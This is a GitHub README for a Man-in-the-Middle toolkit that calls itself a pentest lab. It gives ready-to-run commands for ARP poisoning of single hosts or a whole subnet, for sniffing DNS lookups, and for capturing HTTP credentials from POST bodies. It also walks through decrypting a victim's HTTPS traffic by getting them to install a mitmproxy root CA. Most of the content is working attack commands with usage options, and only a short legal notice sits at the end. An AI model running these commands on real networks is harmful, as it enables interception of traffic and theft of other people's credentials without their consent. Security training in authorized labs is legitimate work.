<div align="center">

# 🕸️ MITM Toolkit

**A modular penetration testing lab for ARP poisoning and traffic analysis.**

[![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Scapy](https://img.shields.io/badge/Scapy-2.5%2B-2C2D72?style=for-the-badge)](https://scapy.net)
[![License](https://img.shields.io/badge/License-MIT-22c55e?style=for-the-badge)](LICENSE)
[![Español](https://img.shields.io/badge/Leer_en-Español-ef4444?style=for-the-badge)](README-Español.md)

</div>

---

## 💡 What Is This?

This toolkit simulates the full lifecycle of a Man-in-the-Middle attack inside a **controlled lab environment**. It covers four stages: network reconnaissance, traffic redirection via ARP cache poisoning, passive monitoring of DNS/HTTP flows, and optional HTTPS decryption through a proxy.

Every tool is self-contained, configurable via CLI flags, and designed to run on Kali Linux or any Debian-based distro.

---

## 🧰 Toolkit at a Glance

```
mitm-toolkit/
├── arpScan.py              # Network recon — find live hosts via ARP
├── AllNetwork_Spoof.sh     # Poison the ARP cache of an entire subnet
├── dns_sniffer.py          # Monitor DNS lookups in real time
├── http_sniffer.py         # Capture HTTP traffic & detect credentials
├── README.md
├── README-Español.md
└── LICENSE
```

---

## ⚡ Quick Start

```bash
# 1. Clone & setup
git clone https://github.com/Eliot-code/Man-In-The-Middle.git && cd Man-In-The-Middle
sudo apt install -y python3-scapy dsniff && pip3 install termcolor
chmod +x AllNetwork_Spoof.sh

# 2. Discover hosts
sudo python3 arpScan.py -t 192.168.1.0/24

# 3. Poison target (terminal 1)
sudo arpspoof -i eth0 -t <VICTIM_IP> -r <GATEWAY_IP>

# 4. Sniff DNS (terminal 2)
sudo python3 dns_sniffer.py -i eth0

# 5. Sniff HTTP (terminal 3)
sudo python3 http_sniffer.py -i eth0
```

---

## 📡 arpScan.py — Network Reconnaissance

Sends ARP who-has requests across a subnet and collects replies. Results are displayed in a color-coded table sorted by IP.

```bash
sudo python3 arpScan.py -t 10.0.0.0/24 -i wlan0 --timeout 3
sudo python3 arpScan.py -t 192.168.1.0/24 -o scan_results.json
```

| Option | What it does | Default |
|--------|-------------|---------|
| `-t` | Target IP or CIDR | *required* |
| `-i` | Interface | auto |
| `--timeout` | Wait time for replies (sec) | `2` |
| `-o` | Export file (`.csv` / `.json`) | — |
| `-v` | Verbose output | off |

You can also use the classic `arp-scan` system tool: `sudo arp-scan -I eth0 --localnet`

---

## 🔀 ARP Cache Poisoning

ARP poisoning tricks hosts into sending their traffic through your machine by forging ARP reply packets. Before starting, enable packet forwarding:

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -P FORWARD ACCEPT
```

### Target a Single Host

```bash
sudo arpspoof -i <IFACE> -t <VICTIM> -r <GATEWAY>
```

> Keep this running in a dedicated terminal.

### Target the Entire Subnet

`AllNetwork_Spoof.sh` launches parallel `arpspoof` instances for every IP in range:

```bash
sudo bash AllNetwork_Spoof.sh                                          # defaults
sudo bash AllNetwork_Spoof.sh -i eth0 -s 10.0.0 -g 10.0.0.1 -j 40   # custom
```

| Option | What it does | Default |
|--------|-------------|---------|
| `-i` | Interface | `ens33` |
| `-s` | Subnet base (3 octets) | `192.168.1` |
| `-g` | Gateway address | `{subnet}.1` |
| `--start / --end` | Host range | `1–254` |
| `-j` | Max parallel processes | `50` |

Built-in safeguards: validates the interface exists, skips the gateway IP, auto-enables forwarding, and kills every child process on `Ctrl+C`.

---

## 🔎 dns_sniffer.py — DNS Query Monitor

Listens on UDP port 53 and logs every domain name the victim resolves. Noisy CDN/telemetry domains are filtered out by default.

```bash
sudo python3 dns_sniffer.py -i eth0
sudo python3 dns_sniffer.py -i eth0 --log captures/dns.log --exclude tiktok instagram
sudo python3 dns_sniffer.py --no-filter   # raw, unfiltered view
```

| Option | What it does | Default |
|--------|-------------|---------|
| `-i` | Interface | auto |
| `--log` | Write to file | — |
| `--no-filter` | Show everything | off |
| `--exclude` | Extra blocked keywords | — |

**Highlights:** marks first-seen domains with `[NEW]`, tracks repeat counts, shows query type (A/AAAA/MX…), identifies source IP, and prints a top-5 summary on exit.

---

## 🌐 http_sniffer.py — HTTP Traffic & Credential Capture

Intercepts unencrypted HTTP requests and inspects POST bodies for sensitive fields like passwords, tokens, and API keys. Only effective on port 80 — HTTPS requires a proxy (see below).

```bash
sudo python3 http_sniffer.py -i eth0
sudo python3 http_sniffer.py -i eth0 --log captures/http.log
```

| Option | What it does | Default |
|--------|-------------|---------|
| `-i` | Interface | auto |
| `--log` | Write to file | — |

**Highlights:** color-codes HTTP methods, URL-decodes POST data into readable `key = value` pairs, scans for 30+ credential keywords, and fires a visual alert when matches are found.

---

## 🔒 HTTPS Decryption via mitmproxy

Intercepting TLS-encrypted traffic requires installing a trusted CA certificate on the target. The workflow uses [mitmproxy](https://mitmproxy.org):

**On the attacker:**

```bash
# Download & extract from mitmproxy.org
tar -xf mitmproxy-*-linux-x86_64.tar.gz
./mitmweb    # starts proxy on :8080 + web UI on :8081
```

**On the victim:**

1. Set system proxy → attacker's IP, port `8080`
2. Open `http://mitm.it` → download & install the CA cert as a **Trusted Root CA**
3. Browse normally — all HTTPS is now decrypted on the attacker's dashboard

**Back on the attacker:**

```bash
./mitmproxy   # TUI mode for full request/response inspection
```

---

## 🛡️ Legal Notice

> **This project exists strictly for educational use in authorized lab environments.**
>
> Deploying these techniques on networks you do not own or without explicit written consent is **illegal** and may result in criminal prosecution. The author assumes zero liability for misuse.
>
> **Best practices:** work inside isolated VMs, respect all applicable laws, and get written permission before testing on any network.

---

## 👤 Author

Built by **Eliot Code**.

---

## 📄 License

[MIT](LICENSE)
